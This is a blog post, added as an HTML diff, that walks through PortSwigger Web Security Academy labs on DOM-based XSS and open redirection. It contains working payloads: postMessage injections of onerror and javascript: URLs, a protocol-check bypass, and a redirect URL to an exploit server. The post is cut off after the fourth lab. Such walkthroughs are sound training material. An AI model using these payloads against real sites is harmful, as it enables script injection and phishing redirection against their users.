@@ -1,0 +1,402 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css" integrity="sha256-5eIC48iZUHmSlSUz9XtjRyK2mzQkHScZY1WdMaoz74E=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"secdroid.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.21.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="0x01. PortSwigger Web Security AcademyPortSwigger Web Security Academy 是 Burp Suite 官方推出的免费 Web 安全学习靶场，在学习 Web 安全知识的同时，还可以练习 Burp Suite 的实战技能。 本篇文章讲解 Web Security Academy 之中的 DOM-based Vulnerabilities">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Burp Web Academy DOM-based Vulnerabilities">
+<meta property="og:url" content="https://secdroid.github.io/2025/03/21/burp-web-academy-dom-based-vulnerabilities/index.html">
+<meta property="og:site_name" content="SecDroid">
+<meta property="og:description" content="0x01. PortSwigger Web Security AcademyPortSwigger Web Security Academy 是 Burp Suite 官方推出的免费 Web 安全学习靶场，在学习 Web 安全知识的同时，还可以练习 Burp Suite 的实战技能。 本篇文章讲解 Web Security Academy 之中的 DOM-based Vulnerabilities">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2025-03-21T14:45:41.260Z">
+<meta property="article:modified_time" content="2025-03-21T14:45:11.000Z">
+<meta property="article:author" content="Livermore">
+<meta property="article:tag" content="XSS">
+<meta property="article:tag" content="SOP">
+<meta property="article:tag" content="DOM">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://secdroid.github.io/2025/03/21/burp-web-academy-dom-based-vulnerabilities/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://secdroid.github.io/2025/03/21/burp-web-academy-dom-based-vulnerabilities/","path":"2025/03/21/burp-web-academy-dom-based-vulnerabilities/","title":"Burp Web Academy DOM-based Vulnerabilities"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Burp Web Academy DOM-based Vulnerabilities | SecDroid</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">SecDroid</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">A security researcher who's looking for a job</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-links"><a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>链接</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-sitemap"><a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>站点地图</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-PortSwigger-Web-Security-Academy"><span class="nav-number">1.</span> <span class="nav-text">0x01. PortSwigger Web Security Academy</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-DOM-based-Vulnerabilities"><span class="nav-number">2.</span> <span class="nav-text">0x02. DOM-based Vulnerabilities</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-1-Lab-DOM-XSS-using-web-messages"><span class="nav-number">2.1.</span> <span class="nav-text">2.1 Lab: DOM XSS using web messages</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-2-Lab-DOM-XSS-using-web-messages-and-a-JavaScript-URL"><span class="nav-number">2.2.</span> <span class="nav-text">2.2 Lab: DOM XSS using web messages and a JavaScript URL</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-3-Lab-DOM-XSS-using-web-messages-and-JSON-parse"><span class="nav-number">2.3.</span> <span class="nav-text">2.3 Lab: DOM XSS using web messages and JSON.parse</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-4-Lab-DOM-based-open-redirection"><span class="nav-number">2.4.</span> <span class="nav-text">2.4 Lab: DOM-based open redirection</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-5-Lab-DOM-based-cookie-manipulation"><span class="nav-number">2.5.</span> <span class="nav-text">2.5 Lab: DOM-based cookie manipulation</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-%E5%B0%8F%E7%BB%93"><span class="nav-number">3.</span> <span class="nav-text">0x03. 小结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-%E5%8F%82%E8%80%83%E6%96%87%E6%A1%A3"><span class="nav-number">4.</span> <span class="nav-text">0x04. 参考文档</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Livermore</p>
+  <div class="site-description" itemprop="description">SecDroid's Diary</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">32</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">41</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://secdroid.github.io/2025/03/21/burp-web-academy-dom-based-vulnerabilities/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Livermore">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="SecDroid">
+      <meta itemprop="description" content="SecDroid's Diary">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Burp Web Academy DOM-based Vulnerabilities | SecDroid">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Burp Web Academy DOM-based Vulnerabilities
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2025-03-21 22:45:41 / 修改时间：22:45:11" itemprop="dateCreated datePublished" datetime="2025-03-21T22:45:41+08:00">2025-03-21</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Vulnerability/" itemprop="url" rel="index"><span itemprop="name">Vulnerability</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Vulnerability/Web/" itemprop="url" rel="index"><span itemprop="name">Web</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Vulnerability/Web/Burp-Web-Academy/" itemprop="url" rel="index"><span itemprop="name">Burp Web Academy</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h2 id="0x01-PortSwigger-Web-Security-Academy"><a href="#0x01-PortSwigger-Web-Security-Academy" class="headerlink" title="0x01. PortSwigger Web Security Academy"></a>0x01. PortSwigger Web Security Academy</h2><p>PortSwigger Web Security Academy 是 <a href="https://secdroid.github.io/tags/Burp/">Burp</a> Suite 官方推出的免费 Web 安全学习靶场，在学习 Web 安全知识的同时，还可以练习 Burp Suite 的实战技能。</p>
+<p>本篇文章讲解 <a href="https://secdroid.github.io/categories/Vulnerability/Web/Burp-Web-Academy/">Web Security Academy</a> 之中的 DOM-based Vulnerabilities（DOM 漏洞）。</p>
+<span id="more"></span>
+
+<h2 id="0x02-DOM-based-Vulnerabilities"><a href="#0x02-DOM-based-Vulnerabilities" class="headerlink" title="0x02. DOM-based Vulnerabilities"></a>0x02. DOM-based Vulnerabilities</h2><h3 id="2-1-Lab-DOM-XSS-using-web-messages"><a href="#2-1-Lab-DOM-XSS-using-web-messages" class="headerlink" title="2.1 Lab: DOM XSS using web messages"></a>2.1 Lab: DOM XSS using web messages</h3><blockquote>
+<p>This lab demonstrates a simple web message vulnerability. To solve this lab, use the exploit server to post a message to the target site that causes the <code>print()</code> function to be called.</p>
+</blockquote>
+<p>查看首页源代码，发现如下信息：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Ads to be inserted here --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&#x27;ads&#x27;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;message&#x27;</span>, <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;ads&#x27;</span>).<span class="property">innerHTML</span> = e.<span class="property">data</span>;</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>要想给一个 Window 对象发送消息，我们首先需要有指向 Window 对象的引用。根据 MDN Web Docs 对 <code>iframe</code> 的介绍，我们可以通过 <code>iframe.contentWindow</code> 进行访问。此外，对 <code>iframe</code> 的访问还涉及到同源策略（Same-Origin Policy，SOP），如果是跨域访问，则 <code>iframe</code> 以及 <code>iframe.contentWindow</code> 的大部分属性都是不可访问的，不过 <code>iframe.contentWindow</code> 本身支持跨域访问，而且还可以调用 <code>postMessage</code> 方法发送消息。</p>
+<p>尝试编写如下 Exploit 代码：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">width</span>=<span class="string">640</span> <span class="attr">height</span>=<span class="string">480</span> <span class="attr">src</span>=<span class="string">&#x27;https://0ab700e30355cc4f86785836002c0078.web-security-academy.net/&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">var</span> iframe = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;iframe&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">  iframe.<span class="property">contentWindow</span>.<span class="title function_">postMessage</span>(<span class="string">&#x27;&lt;img src=1 onerror=print()&gt;&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这是不行的，因为 <code>iframe</code> 是异步加载，所以执行代码中的 JavaScript 代码时，<code>iframe</code> 很可能还没加载完毕。换一种写法：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">width</span>=<span class="string">640</span> <span class="attr">height</span>=<span class="string">480</span> <span class="attr">src</span>=<span class="string">&#x27;https://0ab700e30355cc4f86785836002c0078.web-security-academy.net/&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">var</span> iframe = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;iframe&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">  iframe.<span class="property">onload</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">this</span>.<span class="property">contentWindow</span>.<span class="title function_">postMessage</span>(<span class="string">&#x27;&lt;img src=1 onerror=print()&gt;&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这样仍然不行，<code>postMessage</code> 的语法如下：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">postMessage</span>(message)</span><br><span class="line"><span class="title function_">postMessage</span>(message, targetOrigin)</span><br><span class="line"><span class="title function_">postMessage</span>(message, targetOrigin, transfer)</span><br><span class="line"></span><br><span class="line"><span class="title function_">postMessage</span>(message, options)</span><br></pre></td></tr></table></figure>
+
+<p>如果 <code>targetOrigin</code> 留空，则默认接收方必须与发送方同源。因此，我们可以使用 <code>*</code>，表示对接收方没有任何限制。进一步改进如下：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">width</span>=<span class="string">640</span> <span class="attr">height</span>=<span class="string">480</span> <span class="attr">src</span>=<span class="string">&#x27;https://0ab700e30355cc4f86785836002c0078.web-security-academy.net/&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">var</span> iframe = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;iframe&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">  iframe.<span class="property">onload</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">this</span>.<span class="property">contentWindow</span>.<span class="title function_">postMessage</span>(<span class="string">&#x27;&lt;img src=1 onerror=print()&gt;&#x27;</span>, <span class="string">&#x27;*&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="2-2-Lab-DOM-XSS-using-web-messages-and-a-JavaScript-URL"><a href="#2-2-Lab-DOM-XSS-using-web-messages-and-a-JavaScript-URL" class="headerlink" title="2.2 Lab: DOM XSS using web messages and a JavaScript URL"></a>2.2 Lab: DOM XSS using web messages and a JavaScript URL</h3><blockquote>
+<p>This lab demonstrates a DOM-based redirection vulnerability that is triggered by web messaging. To solve this lab, construct an HTML page on the exploit server that exploits this vulnerability and calls the <code>print()</code> function.</p>
+</blockquote>
+<p>首页存在如下代码：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;message&#x27;</span>, <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> url = e.<span class="property">data</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span> (url.<span class="title function_">indexOf</span>(<span class="string">&#x27;http:&#x27;</span>) &gt; -<span class="number">1</span> || url.<span class="title function_">indexOf</span>(<span class="string">&#x27;https:&#x27;</span>) &gt; -<span class="number">1</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            location.<span class="property">href</span> = url;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;, <span class="literal">false</span>);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>在前一题的基础上做就很简单了：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">width</span>=<span class="string">640</span> <span class="attr">height</span>=<span class="string">480</span> <span class="attr">src</span>=<span class="string">&#x27;https://0a9c0000036361bb81ba2b10002800de.web-security-academy.net/&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">var</span> iframe = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;iframe&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">  iframe.<span class="property">onload</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">this</span>.<span class="property">contentWindow</span>.<span class="title function_">postMessage</span>(<span class="string">&#x27;javascript:print()//http:&#x27;</span>, <span class="string">&#x27;*&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>注意这里添加 <code>//http:</code> 作为 JS 注释，以绕过协议关键字检查。</p>
+<h3 id="2-3-Lab-DOM-XSS-using-web-messages-and-JSON-parse"><a href="#2-3-Lab-DOM-XSS-using-web-messages-and-JSON-parse" class="headerlink" title="2.3 Lab: DOM XSS using web messages and JSON.parse"></a>2.3 Lab: DOM XSS using web messages and <code>JSON.parse</code></h3><blockquote>
+<p>This lab uses web messaging and parses the message as JSON. To solve the lab, construct an HTML page on the exploit server that exploits this vulnerability and calls the <code>print()</code> function.</p>
+</blockquote>
+<p>首页存在如下代码：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;message&#x27;</span>, <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> iframe = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;iframe&#x27;</span>), <span class="title class_">ACMEplayer</span> = &#123;<span class="attr">element</span>: iframe&#125;, d;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(iframe);</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">try</span> &#123;</span></span><br><span class="line"><span class="language-javascript">            d = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(e.<span class="property">data</span>);</span></span><br><span class="line"><span class="language-javascript">        &#125; <span class="keyword">catch</span>(e) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">return</span>;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">switch</span>(d.<span class="property">type</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">case</span> <span class="string">&quot;page-load&quot;</span>:</span></span><br><span class="line"><span class="language-javascript">                <span class="title class_">ACMEplayer</span>.<span class="property">element</span>.<span class="title function_">scrollIntoView</span>();</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">break</span>;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">case</span> <span class="string">&quot;load-channel&quot;</span>:</span></span><br><span class="line"><span class="language-javascript">                <span class="title class_">ACMEplayer</span>.<span class="property">element</span>.<span class="property">src</span> = d.<span class="property">url</span>;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">break</span>;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">case</span> <span class="string">&quot;player-height-changed&quot;</span>:</span></span><br><span class="line"><span class="language-javascript">                <span class="title class_">ACMEplayer</span>.<span class="property">element</span>.<span class="property">style</span>.<span class="property">width</span> = d.<span class="property">width</span> + <span class="string">&quot;px&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">                <span class="title class_">ACMEplayer</span>.<span class="property">element</span>.<span class="property">style</span>.<span class="property">height</span> = d.<span class="property">height</span> + <span class="string">&quot;px&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">break</span>;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;, <span class="literal">false</span>);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>注意这里 <code>ACMEplayer.element</code> 就是 <code>iframe</code> 对象，所以可以发消息修改 <code>iframe.src</code>，实现 XSS 调用 <code>print()</code>。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">width</span>=<span class="string">640</span> <span class="attr">height</span>=<span class="string">480</span> <span class="attr">src</span>=<span class="string">&#x27;https://0a20009503938167886e618500400085.web-security-academy.net/&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">var</span> iframe = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;iframe&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">  iframe.<span class="property">onload</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">this</span>.<span class="property">contentWindow</span>.<span class="title function_">postMessage</span>(<span class="string">&#x27;&#123;&quot;type&quot;:&quot;load-channel&quot;, &quot;url&quot;:&quot;javascript:print()&quot;&#125;&#x27;</span>, <span class="string">&#x27;*&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>注意，JSON 的字符串使用双引号而不是单引号。</p>
+<h3 id="2-4-Lab-DOM-based-open-redirection"><a href="#2-4-Lab-DOM-based-open-redirection" class="headerlink" title="2.4 Lab: DOM-based open redirection"></a>2.4 Lab: DOM-based open redirection</h3><blockquote>
+<p>This lab contains a DOM-based open-redirection vulnerability. To solve this lab, exploit this vulnerability and redirect the victim to the exploit server.</p>
+</blockquote>
+<p>点击进入文章，右下角发现 <code>Back to Blog</code>，代码如下</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;is-linkback&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&#x27;#&#x27;</span> <span class="attr">onclick</span>=<span class="string">&#x27;returnUrl = /url=(https?:\/\/.+)/.exec(location); location.href = returnUrl ? returnUrl[1] : &quot;/&quot;&#x27;</span>&gt;</span></span><br><span class="line">    Back to Blog</span><br><span class="line">  <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>访问如下页面：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://0aed00eb0461142282dabae3006c002c.web-security-academy.net/post?postId=8&amp;url=https://exploit-0acd001e044b1455824cb96501280005.exploit-server.net/</span><br></pre></td></tr></table></figure>
+
+<p>然后点击 <code>Back to Blog</code> 即可。</p>
